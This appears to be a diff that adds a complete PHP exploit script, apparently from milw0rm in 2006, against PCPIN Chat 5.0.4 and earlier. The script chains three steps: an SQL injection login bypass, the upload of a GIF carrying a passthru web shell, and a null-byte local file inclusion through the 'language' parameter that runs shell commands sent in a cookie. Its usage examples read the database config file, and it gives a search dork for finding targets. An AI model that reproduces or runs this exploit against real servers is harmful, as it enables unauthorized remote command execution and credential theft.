@@ -1,0 +1,266 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "PCPIN Chat <= 5.0.4 \"login/language\" remote cmmnds xctn\r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n\r\n";
+echo "-> works with magic_quotes_gpc = Off\r\n";
+echo "dork: \"powered by PCPIN.com\"\r\n\r\n";
+
+if ($argc<4) {
+echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to pcpin\r\n";
+echo "cmd:       a shell command\r\n";
+echo "Options:\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Examples:\r\n";
+echo "php ".$argv[0]." localhost /pcpin/ cat ./config/db.inc.php\r\n";
+echo "php ".$argv[0]." localhost /pcpin/ ls -la -p81\r\n";
+echo "php ".$argv[0]." localhost / ls -la -P1.1.1.1:80\r\n";
+die;
+}
+
+/*
+   software site: http://www.pcpin.com/
+   description: a chat software written in php that uses mysql for data storage
+
+   vulnerabilites:
+   i) sql injection:
+   you can login as admin typing:
+   username: ") or isnull(1/0)/*
+   password: [whatever]
+
+   query becomes:
+   SELECT * FROM pcpin_user WHERE (cookie = "#EMPTY#" AND cookie <> "") OR
+   (login = "") or isnull(1/0)/* AND password = "[somehash]") AND activated = "1"
+   LIMIT 1
+
+   ii) arbitrary local inclusion:
+   now you can upload smilies with php code inside, we have a local inclusion
+   bug in "language" argument when you select a language so, you can include
+   a gif file and launch commands...
+
+   both works with magic_quotes_gpc=Off
+                       							      */
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+}
+
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";$port=80;$proxy="";
+
+for ($i=3; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+$cmd=urlencode($cmd);
+
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+
+#step 1 -> sql injection, login as admin
+echo "[1] login...\r\n";
+$sql="\") or isnull(1/0)/*";
+$sql=urlencode($sql);
+$data ="lostpassword=";
+$data.="&include=2";
+$data.="&language=english";
+$data.="&submitted=1";
+$data.="&login=".$sql;
+$data.="&password=suntzu";
+$packet ="POST ".$p."main.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Accept: text/plain\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n\r\n";
+$packet.=$data;
+#debug
+#echo quick_dump($packet);
+sendpacketii($packet);
+$temp=explode("Set-Cookie: ",$html);
+$temp2=explode(" ",$temp[1]);
+$cookie=$temp2[0];
+if ($cookie =='') {die("Unable to retrieve session cookie...");}
+echo "Cookie -> ".$cookie."\r\n";
+$temp=explode("name=\"session_id\" value=\"",$html);
+$temp2=explode("\"",$temp[1]);
+$sid=$temp2[0];
+if ($sid =='') {die("Unable to retrieve session id...");}
+echo "session id -> ".$sid."\r\n";
+
+srand(make_seed());
+$v = rand(1,99999);
+
+#step 2 -> Upload a malicious gif file...
+echo "[2] uploading the gif file...\r\n";
+$data='-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="smiliefile"; filename="suntzu.gif"
+Content-Type: image/gif
+
+<?php echo 56789;ini_set("max_execution_time",0);error_reporting(0);passthru($_REQUEST[suntzu]);echo 56789;?>
+-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="session_id";
+
+'.$sid.'
+-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="include";
+
+26
+-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="text";
+
+suntzu'.$v.'
+-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="smilie_id"
+
+
+-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="add"
+
+1
+-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="edit"
+
+
+-----------------------------7d613b1d0448
+Content-Disposition: form-data; name="submitted"
+
+1
+-----------------------------7d613b1d0448--
+';
+
+
+$packet ="POST ".$p."main.php HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d613b1d0448\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cookie: ".$cookie."\r\n\r\n";
+$packet.=$data;
+#debug
+#echo quick_dump($packet);
+sendpacketii($packet);
+//echo $html;
+$temp=explode("smilies/",$html); //file is renamed, let's retrieve new filename...it is the last in smilies list
+$temp2=explode("\"",$temp[count($temp)-1]);
+$fn=$temp2[0];
+if ($fn =='') {die("Unable to retrieve evil gif filename...");}
+echo "filename -> ".$fn."\r\n";
+
+#step 3-> logout... you need this to launch again exploit
+echo "[3] logout...\r\n";
+$data="session_id=".$sid."&include=9";
+$packet ="POST ".$p."main.php HTTP/1.0\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cookie: ".$cookie."\r\n\r\n";
+$packet.=$data;
+#debug
+#echo quick_dump($packet);
+sendpacketii($packet);
+if (strstr($html,"window.location.href")) {echo "done...\r\n";}
+                                     else {echo "maybe not...\r\n";}
+
+#step 4-> launch commands
+echo "[4] sending command...\r\n";
+$xpl=urlencode("../images/smilies/".$fn.chr(0x00));
+$data="language=".$xpl;
+$packet ="POST ".$p."main.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Cookie: suntzu=".$cmd.";\r\n"; //pass commands through cookies
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+#debug
+#echo quick_dump($packet);
+sendpacketii($packet);
+  if (strstr($html,"56789"))
+  {
+   echo "Exploit succeeded...\r\n\r\n";
+   $temp=explode("56789",$html);
+   die($temp[1]);
+  }
+//if you are here...
+echo "Exploit failed...";
+?>
+
+# milw0rm.com [2006-04-19]
